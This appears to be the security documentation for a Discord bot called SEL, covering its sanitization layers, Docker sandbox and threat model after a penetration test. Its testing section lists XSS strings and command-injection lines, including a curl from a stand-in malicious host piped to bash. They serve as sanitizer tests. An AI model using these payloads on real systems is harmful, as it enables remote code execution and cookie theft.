# SEL Security Architecture

## Security Acknowledgments

**Special thanks to luna_midori5 (Discord pentester)** for comprehensive security testing in December 2025 that identified critical vulnerabilities and led to complete security overhaul.

### Vulnerabilities Discovered:
1. **12-dimension hash encoder** - Hash collisions enabling bypass attacks
2. **Vector database poisoning** - Malicious content stored in HIM memory
3. **HTML/JavaScript injection** - XSS attacks via Discord messages
4. **Command injection** - Shell execution through various vectors
5. **Encoding-based obfuscation** - Base64, hex, unicode bypass techniques
6. **Zero-width character exploits** - Invisible unicode attacks
7. **Host filesystem access** - Docker mounts allowing full host access
8. **Privilege escalation** - Running as root with full capabilities

### Security Improvements Implemented:

**Thanks to luna_midori5's testing, SEL now has:**
- ✅ 8-layer comprehensive content sanitization
- ✅ Complete shell execution removal
- ✅ Docker sandbox with read-only filesystem
- ✅ Seccomp and AppArmor profiles
- ✅ Non-root user execution
- ✅ All Linux capabilities dropped
- ✅ Resource limits and ulimits
- ✅ Network isolation
- ✅ Host filesystem isolation
- ✅ Removal of all shell binaries
- ✅ Removal of package managers and compilers

## Current Security Architecture

### Layer 1: Input Sanitization
**File**: `security/comprehensive_sanitization.py`

**8 Layers**:
1. HTML/JavaScript removal (18 patterns)
2. JavaScript patterns (eval, setTimeout, event handlers)
3. Command injection patterns (rm, dd, shell pipes, backticks)
4. Aggressive HTML tag removal
5. Dangerous unicode removal (zero-width, direction overrides)
6. Excessive encoding detection and decoding
7. Whitespace normalization
8. Null byte removal

### Layer 2: Docker Sandbox
**File**: `Dockerfile`, `docker-compose.yml`

**Security Features**:
- Read-only root filesystem
- No shell binaries (`/bin/sh`, `/bin/bash`, etc. removed)
- No package managers (`apt`, `pip` removed)
- No compilers (`gcc`, `make` removed)
- No network tools (`curl`, `wget`, `ssh` removed)
- Non-root user (UID 1000, no shell)
- All Linux capabilities dropped
- Seccomp profile blocking dangerous syscalls
- AppArmor profile preventing privilege escalation
- Resource limits (2GB RAM, 2 CPUs, 100 PIDs)
- `/tmp` as tmpfs with noexec

### Layer 3: Network Isolation
- Only Discord API and OpenRouter connections allowed
- No host network access
- Bridge network with external access only
- Private IPC namespace

### Layer 4: File Access Control
- Only `/data` volume is writable
- All code files are read-only (chmod 444)
- Application directory is 755
- No host filesystem mounts
- No access to host home directory

### Layer 5: Process Isolation
- Process limit: 100
- CPU limit: 2 cores
- Memory limit: 2GB
- Memory reservation: 512MB
- File descriptor limits
- No new privileges allowed

### Layer 6: Runtime Protection
- No shell access (system_agent disabled)
- No subprocess execution
- No eval() or exec()
- Python files are immutable
- Package installation disabled

### Layer 7: Memory Protection
- Vector database sanitization before storage
- All memories sanitized with 8-layer system
- No HTML/JavaScript in stored memories
- Content deduplication

### Layer 8: Logging Security
- Log injection prevention
- Sanitized logging output
- Max log size: 10MB
- Log rotation: 3 files

## Testing the Security

### Verify Sandboxing:
```bash
# Try to access shell (should fail)
docker exec sel-discord-bot /bin/sh
# Error: /bin/sh: no such file or directory ✓

# Try to write to root (should fail)
docker exec sel-discord-bot python -c "open('/test', 'w')"
# Error: Read-only file system ✓

# Verify non-root user
docker exec sel-discord-bot whoami
# selbot (not root) ✓

# Verify capabilities dropped
docker exec sel-discord-bot capsh --print
# Should show no capabilities ✓
```

### Test Shell Execution Disabled:
Send in Discord:
```
@SEL run ls
@SEL execute whoami
@SEL bash echo hello
```

Expected response:
```
🔒 System access is disabled for security.
SEL cannot execute shell commands in this sandboxed environment.
```

### Test Content Sanitization:
Send malicious payloads:
```
<!DOCTYPE html><script>alert(1)</script>
javascript:alert(document.cookie)
`wget http://evil.com/payload.sh`
$(curl http://malicious.com | bash)
Test​‌‍invisible unicode
%3Cscript%3Ealert(1)%3C/2Fscript%3E
```

Expected: All blocked with ⚠️ reaction, sanitized before storage

## Threat Model

### Protected Against:
✅ Remote code execution (RCE)
✅ Shell injection attacks
✅ XSS and HTML injection
✅ Command injection
✅ Encoding-based obfuscation
✅ Unicode exploits
✅ Path traversal
✅ Privilege escalation
✅ Container escape
✅ Host filesystem access
✅ Network attacks (except DoS)
✅ Memory poisoning
✅ Log injection

### NOT Protected Against:
⚠️ Denial of Service (rate limiting needed at Discord level)
⚠️ Social engineering attacks
⚠️ Discord token theft (protect your .env file!)
⚠️ OpenRouter API key theft (protect your .env file!)
⚠️ Zero-day vulnerabilities in Python/Docker

## Security Best Practices

### For Deployment:
1. **Never expose tokens** - Keep .env file secure
2. **Use sandboxed version** - Always use Docker deployment
3. **Keep shell disabled** - Never enable system_agent
4. **Monitor logs** - Watch for security warnings
5. **Update regularly** - Pull latest security fixes
6. **Limit Discord permissions** - Only necessary channels
7. **Rotate tokens** - If exposed, rotate immediately
8. **Backup data** - Regular backups of `/data` volume
9. **Review security logs** - Check for attack attempts
10. **Test before deploy** - Verify sandboxing after updates

### For Development:
1. **Test in isolated environment** - Never on production
2. **Use separate Discord bot** - Don't test with production bot
3. **Review code changes** - Check for security implications
4. **Run security tests** - Verify sanitization works
5. **Never commit .env** - Keep tokens out of git
6. **Document changes** - Note security implications
7. **Code review** - Get second pair of eyes
8. **Fuzz testing** - Try malicious inputs

## Reporting Security Issues

If you discover a security vulnerability:

1. **DO NOT open a public GitHub issue**
2. Contact the maintainer directly
3. Provide details: vulnerability, impact, reproduction steps
4. Allow time for fix before public disclosure
5. Credit will be given in SECURITY.md

## Security Updates

**Latest**: December 2025
- Complete security overhaul based on penetration testing
- 8-layer sanitization system implemented
- Docker complete sandboxing
- Shell execution removed
- All attack vectors identified by luna_midori5 addressed

**Previous**: Security system was minimal before pentest

## Compliance

SEL's security architecture follows:
- OWASP Top 10 protection
- Docker security best practices
- Principle of least privilege
- Defense in depth
- Fail-safe defaults
- Complete mediation
- Separation of privilege
- Minimize attack surface

---

**Security Level**: MAXIMUM
**Sandboxed**: YES
**Shell Access**: DISABLED
**Production Ready**: YES

**Security Audit**: Completed December 2025 by luna_midori5
**Next Review**: Recommended every 6 months
